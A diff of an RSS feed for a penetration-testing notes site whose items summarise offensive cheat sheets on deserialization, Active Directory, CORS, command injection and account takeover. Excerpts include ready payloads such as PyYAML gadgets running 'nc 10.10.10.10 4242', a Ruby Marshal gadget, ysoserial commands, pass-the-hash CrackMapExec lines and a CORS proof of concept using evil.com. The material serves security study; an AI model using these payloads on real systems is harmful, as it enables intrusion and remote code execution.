@@ -1,36 +1,311 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Docs on Gray Hat Freelancing</title><link>https://www.grayhatfreelancing.com/docs/</link><description>Recent content in Docs on Gray Hat Freelancing</description><generator>Hugo -- gohugo.io</generator><copyright>2023</copyright><lastBuildDate>Mon, 27 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml"/><item><title>.NET Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</guid><description>.NET Serialization # Summary # Detection Tools Formatters XmlSerializer DataContractSerializer NetDataContractSerializer LosFormatter JSON.NET BinaryFormatter POP Gadgets References Detection # AAEAAD (Hex) = .NET deserialization BinaryFormatter FF01 (Hex) / /w (Base64) = .NET ViewState Example: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
-Tools # pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini $ .</description></item><item><title>Exercism Solutions</title><link>https://www.grayhatfreelancing.com/docs/exercism_solutions/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/exercism_solutions/</guid><description>Exercism Solutions # These solutions are provided so that you can check your work or get an idea, if you&amp;rsquo;re stuck. If you use them to cheat, understand that you&amp;rsquo;re only cheating yourself. That goes for everything on this website.
-Python # Armstrong Numbers # import math def is_armstrong_number(number): &amp;#34;&amp;#34;&amp;#34; A number is an &amp;#34;armstrong&amp;#34; number if the sum of the powers of it&amp;#39;s length applied to each digit in the number adds up to the number :param number: int - returns True if number is an amrstrong &amp;#34;&amp;#34;&amp;#34; power = len(str(number)) sums = [] for i in str(number): sums.</description></item><item><title>Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</guid><description>Insecure Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process &amp;ndash; taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files :</description></item><item><title>Node Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</guid><description>Node Deserialization # Summary # Exploit node-serialize funcster References Exploit # In Node source code, look for: node-serialize serialize-to-js funcster node-serialize # An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).
-Generate a serialized payload var y = { rce : function(){ require(&amp;#39;child_process&amp;#39;).</description></item><item><title>PHP Insecure Deserialization</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</link><pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</guid><description>PHP Deserialization # PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</description></item><item><title>Insecure Deserialization - Java</title><link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</link><pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</guid><description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: __STREAM_MAGIC__. Specifies that this is a serialization protocol. 00 05: __STREAM_VERSION__. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Docs on Gray Hat Freelancing</title>
+    <link>https://www.grayhatfreelancing.com/docs/</link>
+    <description>Recent content in Docs on Gray Hat Freelancing</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>2023</copyright>
+    <lastBuildDate>Tue, 28 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.grayhatfreelancing.com/docs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Account Takeovers</title>
+      <link>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/checking_for_account_takeover/</guid>
+      <description>* [Bypass 2FA with null or 000000](#bypass-2fa-with-null-or-000000) * [Bypass 2FA with array](#bypass-2fa-with-array) References Password Reset Feature # Password Reset Token Leak Via Referrer # Request password reset to your email address Click on the password reset link Don&amp;rsquo;t change password Click any 3rd party websites(eg: Facebook, twitter) Intercept the request in Burp Suite proxy Check if the referer header is leaking password reset token. Account Takeover Through Password Reset Poisoning # Intercept the password reset request in Burp Suite Add or edit the following headers in Burp Suite : Host: attacker.</description>
+    </item>
+    
+    <item>
+      <title>Active Directory Attacks</title>
+      <link>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</guid>
+      <description>Active Directory Attacks # Summary # Active Directory Attacks Summary Tools Kerberos Clock Synchronization Active Directory Recon Using BloodHound Using PowerView Using AD Module From CVE to SYSTEM shell on DC MS14-068 Checksum Validation ZeroLogon PrintNightmare samAccountName spoofing Open Shares SCF and URL file attack against writeable share SCF Files URL Files Windows Library Files Windows Search Connectors Files Passwords in SYSVOL &amp;amp; Group Policy Preferences Exploit Group Policy Objects GPO Find vulnerable GPO Abuse GPO with SharpGPOAbuse Abuse GPO with PowerGPOAbuse Abuse GPO with pyGPOAbuse Abuse GPO with PowerView Abuse GPO with StandIn Dumping AD Domain Credentials DCSync Attack Volume Shadow Copy Extract hashes from ntds.</description>
+    </item>
+    
+    <item>
+      <title>Amazon AWS S3 Buckets</title>
+      <link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid>
+      <description>Amazon Bucket S3 AWS # Summary # AWS Configuration Open Bucket Basic tests Listing files Move a file into the bucket Download every things Check bucket disk size AWS - Extract Backup Bucket juicy data AWS Configuration # Prerequisites, at least you need awscli
+sudo apt install awscli You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/
+aws configure AWSAccessKeyId=[ENTER HERE YOUR KEY] AWSSecretKey=[ENTER HERE YOUR KEY] aws configure --profile nameofprofile then you can use &amp;ndash;profile nameofprofile in the aws command.</description>
+    </item>
+    
+    <item>
+      <title>API Key Leaks</title>
+      <link>https://www.grayhatfreelancing.com/docs/api_key_leaks/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/api_key_leaks/</guid>
+      <description>API Key Leaks # The API key is a unique identifier that is used to authenticate requests associated with your project. Some developers might hardcode them or leave it on public shares.
+Summary # Tools Exploit Google Maps Algolia AWS Access Key ID &amp;amp; Secret Slack API Token Facebook Access Token Github client id and client secret Twilio Account_sid and Auth Token Twitter API Secret Twitter Bearer Token Gitlab Personal Access Token HockeyApp API Token IIS Machine Keys Mapbox API Token Tools # KeyFinder - is a tool that let you find keys while surfing the web!</description>
+    </item>
+    
+    <item>
+      <title>Argument Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/argument_injection/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/argument_injection/</guid>
+      <description>Argument Injection # Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.
+It can happen in different situations, where you can only inject arguments to a command:
+Improper sanitization (regex) Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen) Bash expansion (ex: *) In the following example, a python script takes the inputs from the command line to generate a curl command:</description>
+    </item>
+    
+    <item>
+      <title>Command Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/command_injection/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/command_injection/</guid>
+      <description>Command Injection # Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+Summary # Tools Exploits Basic commands Chaining commands Inside a command Filter Bypasses Bypass without space Bypass with a line return Bypass with backslash newline Bypass characters filter via hex encoding Bypass blacklisted words Bypass with single quote Bypass with double quote Bypass with backslash and slash Bypass with $@ Bypass with $() Bypass with variable expansion Bypass with wildcards Challenge Time based data exfiltration DNS based data exfiltration Polyglot command injection Backgrounding long running commands References Tools # commix - Automated All-in-One OS command injection and exploitation tool Exploits # Basic commands # Execute the command and voila :p</description>
+    </item>
+    
+    <item>
+      <title>CORS Misconfigurations</title>
+      <link>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/cors_misconfigurations/</guid>
+      <description>Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint.
+Vulnerable Example: Origin Reflection # Vulnerable Implementation # GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {&amp;#34;[private API key]&amp;#34;} Proof of concept # This PoC requires that the respective JS script is hosted at evil.com
+var req = new XMLHttpRequest(); req.onload = reqListener; req.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injection</title>
+      <link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid>
+      <description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description>
+    </item>
+    
+    <item>
+      <title>Directory Traversal</title>
+      <link>https://www.grayhatfreelancing.com/docs/directory_traversal/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/directory_traversal/</guid>
+      <description>Directory Traversal # A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing &amp;ldquo;traverse to parent directory&amp;rdquo; are passed through to the file APIs.
+Summary # Tools Basic exploitation 16 bits Unicode encoding UTF-8 Unicode encoding Bypass &amp;ldquo;../&amp;rdquo; replaced by &amp;ldquo;&amp;rdquo; Bypass &amp;ldquo;../&amp;rdquo; with &amp;ldquo;;&amp;rdquo; Double URL encoding UNC Bypass NGINX/ALB Bypass Path Traversal Interesting Linux files Interesting Windows files References Tools # dotdotpwn - https://github.</description>
+    </item>
+    
+    <item>
+      <title>Network Discovery</title>
+      <link>https://www.grayhatfreelancing.com/docs/network_discovery/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/network_discovery/</guid>
+      <description>Network Discovery # Summary # Nmap Spyse Masscan Netdiscover Responder Bettercap Reconnoitre SSL MITM with OpenSSL References Nmap # Ping sweep (No port scan, No DNS resolution) nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v &amp;#34;host down&amp;#34; -sn : Disable port scanning. Host discovery only. -n : Never do DNS resolution Basic NMAP sudo nmap -sSV -p- 192.168.0.1 -oA OUTPUTFILE -T4 sudo nmap -sSV -oA OUTPUTFILE -T4 -iL INPUTFILE.csv • the flag -sSV defines the type of packet to send to the server and tells Nmap to try and determine any service on open ports • the -p- tells Nmap to check all 65,535 ports (by default it will only check the most popular 1,000) • 192.</description>
+    </item>
+    
+    <item>
+      <title>Python Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/python/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/python/</guid>
+      <description>Python Deserialization # In Python source code, look for: cPickle.loads pickle.loads _pickle.loads jsonpickle.decode Pickle # The following code is a simple example of using cPickle in order to generate an auth_token which is a serialized User object. :warning: import cPickle will only work on Python 2
+import cPickle from base64 import b64encode, b64decode class User: def __init__(self): self.username = &amp;#34;anonymous&amp;#34; self.password = &amp;#34;anonymous&amp;#34; self.rank = &amp;#34;guest&amp;#34; h = User() auth_token = b64encode(cPickle.</description>
+    </item>
+    
+    <item>
+      <title>Ruby Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/ruby/</guid>
+      <description>Ruby Deserialization # Marshal.load # Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5
+for i in {0..5}; do docker run -it ruby:2.${i} ruby -e &amp;#39;Marshal.load([&amp;#34;0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446&amp;#34;].pack(&amp;#34;H*&amp;#34;)) rescue nil&amp;#39;; done Yaml.load # Vulnerable code
+require &amp;#34;yaml&amp;#34; YAML.load(File.read(&amp;#34;p.yml&amp;#34;)) Universal gadget for ruby &amp;lt;= 2.7.2:
+--- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source::SpecificFile spec: &amp;amp;1 !ruby/object:Gem::StubSpecification loaded_from: &amp;#34;|id 1&amp;gt;&amp;amp;2&amp;#34; - !ruby/object:Gem::Source::SpecificFile spec: Universal gadget for ruby 2.x - 3.</description>
+    </item>
+    
+    <item>
+      <title>Web Sockets Attacks</title>
+      <link>https://www.grayhatfreelancing.com/docs/web_sockets/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/web_sockets/</guid>
+      <description>Web Sockets # The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server
+Summary # Tools Exploit Using ws-harness.py Cross-Site WebSocket Hijacking (CSWSH) Labs References Tools # ws-harness.py Exploit # Using ws-harness.py # Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.
+python ws-harness.py -u &amp;#34;ws://dvws.local:8080/authenticate-user&amp;#34; -m ./message.txt The content of the message should contains the [FUZZ] keyword.</description>
+    </item>
+    
+    <item>
+      <title>YAML Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</link>
+      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/yaml/</guid>
+      <description>YAML Deserialization # Summary # Tools Exploit PyYAML ruamel.yaml Ruby SnakeYAML References Tools # j0lt-github/python-deserialization-attack-payload-generator artsploit/yaml-payload - A tiny project for generating SnakeYAML deserialization payloads mbechler/marshalsec Exploit # PyYAML # !!python/object/apply:time.sleep [10] !!python/object/apply:builtins.range [1, 10, 1] !!python/object/apply:os.system [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/apply:os.popen [&amp;#34;nc 10.10.10.10 4242&amp;#34;] !!python/object/new:subprocess [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/new:subprocess.check_output [[&amp;#34;ls&amp;#34;,&amp;#34;-ail&amp;#34;]] !!python/object/apply:subprocess.Popen - ls !!python/object/new:str state: !!python/tuple - &amp;#39;print(getattr(open(&amp;#34;flag\x2etxt&amp;#34;), &amp;#34;read&amp;#34;)())&amp;#39; - !!python/object/new:Warning state: update: !!python/name:exec Since PyYaml version 6.0, the default loader for load has been switched to SafeLoader mitigating the risks against Remote Code Execution.</description>
+    </item>
+    
+    <item>
+      <title>.NET Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/dotnet/</guid>
+      <description>.NET Serialization # Summary # Detection Tools Formatters XmlSerializer DataContractSerializer NetDataContractSerializer LosFormatter JSON.NET BinaryFormatter POP Gadgets References Detection # AAEAAD (Hex) = .NET deserialization BinaryFormatter FF01 (Hex) / /w (Base64) = .NET ViewState Example: AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=
+Tools # pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s $ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini $ .</description>
+    </item>
+    
+    <item>
+      <title>Exercism Solutions</title>
+      <link>https://www.grayhatfreelancing.com/docs/exercism_solutions/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/exercism_solutions/</guid>
+      <description>Exercism Solutions # These solutions are provided so that you can check your work or get an idea, if you&amp;rsquo;re stuck. If you use them to cheat, understand that you&amp;rsquo;re only cheating yourself. That goes for everything on this website.
+Python # Armstrong Numbers # import math def is_armstrong_number(number): &amp;#34;&amp;#34;&amp;#34; A number is an &amp;#34;armstrong&amp;#34; number if the sum of the powers of it&amp;#39;s length applied to each digit in the number adds up to the number :param number: int - returns True if number is an amrstrong &amp;#34;&amp;#34;&amp;#34; power = len(str(number)) sums = [] for i in str(number): sums.</description>
+    </item>
+    
+    <item>
+      <title>Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/</guid>
+      <description>Insecure Deserialization # Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process &amp;ndash; taking data structured from some format, and rebuilding it into an object - OWASP Check the following sub-sections, located in other files :</description>
+    </item>
+    
+    <item>
+      <title>Node Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/node/</guid>
+      <description>Node Deserialization # Summary # Exploit node-serialize funcster References Exploit # In Node source code, look for: node-serialize serialize-to-js funcster node-serialize # An issue was discovered in the node-serialize package 0.0.4 for Node.js. Untrusted data passed into the unserialize() function can be exploited to achieve arbitrary code execution by passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).
+Generate a serialized payload var y = { rce : function(){ require(&amp;#39;child_process&amp;#39;).</description>
+    </item>
+    
+    <item>
+      <title>PHP Insecure Deserialization</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</link>
+      <pubDate>Mon, 27 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/php/</guid>
+      <description>PHP Deserialization # PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</description>
+    </item>
+    
+    <item>
+      <title>Insecure Deserialization - Java</title>
+      <link>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</link>
+      <pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/</guid>
+      <description>Java Deserialization # Detection # &amp;quot;AC ED 00 05&amp;quot; in Hex AC ED: __STREAM_MAGIC__. Specifies that this is a serialization protocol. 00 05: __STREAM_VERSION__. The serialization version. &amp;quot;rO0&amp;quot; in Base64 Content-type = &amp;quot;application/x-java-serialized-object&amp;quot; &amp;quot;H4sIAAAAAAAAAJ&amp;quot; in gzip(base64)
 Tools # Ysoserial # frohoff/ysoserial : A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
-java -jar ysoserial.jar CommonsCollections1 calc.exe &amp;gt; commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin java -jar ysoserial.</description></item><item><title>Amazon AWS S3 Buckets</title><link>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</link><pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/amazon_aws_s3_buckets/</guid><description>Amazon Bucket S3 AWS # Amazon S3 (Simple Storage Service) Buckets are data object storage buckets hosted on Amazon&amp;rsquo;s cloud service. Being in the cloud it&amp;rsquo;s a highly scalable data storge service and it allows you to set all sorts of permissions and other controls around your data. That said, there&amp;rsquo;s often plenty of juicy information in Amazon S3 buckets.. there&amp;rsquo;s also often nothing more than just images and such.</description></item><item><title>CSRF Injection</title><link>https://www.grayhatfreelancing.com/docs/csrf_injection/</link><pubDate>Thu, 02 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/csrf_injection/</guid><description>Cross-Site Request Forgery # Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they&amp;rsquo;re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
-Tools # XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology # Payloads # When you are logged in to a certain site, you typically have a session.</description></item><item><title>Cobalt Strike</title><link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link><pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</guid><description>Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
-$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.</description></item><item><title>Brute Force Cracking</title><link>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</link><pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid><description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
+java -jar ysoserial.jar CommonsCollections1 calc.exe &amp;gt; commonpayload.bin java -jar ysoserial.jar Groovy1 calc.exe &amp;gt; groovypayload.bin java -jar ysoserial.</description>
+    </item>
+    
+    <item>
+      <title>Cobalt Strike</title>
+      <link>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</link>
+      <pubDate>Mon, 20 Feb 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/cobalt_strike_all_you_need/</guid>
+      <description>Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.
+$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.</description>
+    </item>
+    
+    <item>
+      <title>Brute Force Cracking</title>
+      <link>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</link>
+      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/brute_force_cracking/</guid>
+      <description>Brute Force Cracking # Making wordslists # Find as much information about the target as you can and generate a custom dictionary. Tools that may help:
 WikiRaider # Generate wordlists fit for your &amp;ldquo;target audience&amp;rdquo;. https://github.com/NorthwaveSecurity/wikiraider
-Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description></item><item><title>Training Grounds</title><link>https://www.grayhatfreelancing.com/docs/training_grounds/</link><pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/training_grounds/</guid><description>Training Grounds # Online Websites and Communities # HackTheBox.EU &amp;amp; HTB Catalogue Hackthebox has online machines to hack, it&amp;rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos. HackTheBox Academy is connected to HackerOne.
-TryHackMe Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there&amp;rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!</description></item><item><title>Active Directory Attacks</title><link>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</link><pubDate>Thu, 08 Dec 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/attacking_active_directory/</guid><description>Active Directory Attacks # Tools # Impacket or the Windows version
-Responder
-InveighZero
-Mimikatz
-Ranger
-AdExplorer
-CrackMapExec
-# use the latest release, CME is now a binary packaged will all its dependencies root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip # execute cme (smb, winrm, mssql, ...) root@payload$ cme smb -L root@payload$ cme smb -M name_module -o VAR=DATA root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares root@payload$ cme smb 192.</description></item><item><title>Wordpress Security</title><link>https://www.grayhatfreelancing.com/docs/wordpress/</link><pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/wordpress/</guid><description>WordPress Security # Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it&amp;rsquo;s just. &amp;ndash; gem install wpscan &amp;ndash; docker pull wpscanteam/wpscan &amp;ndash; wpscan &amp;ndash;update # updates the database &amp;ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:
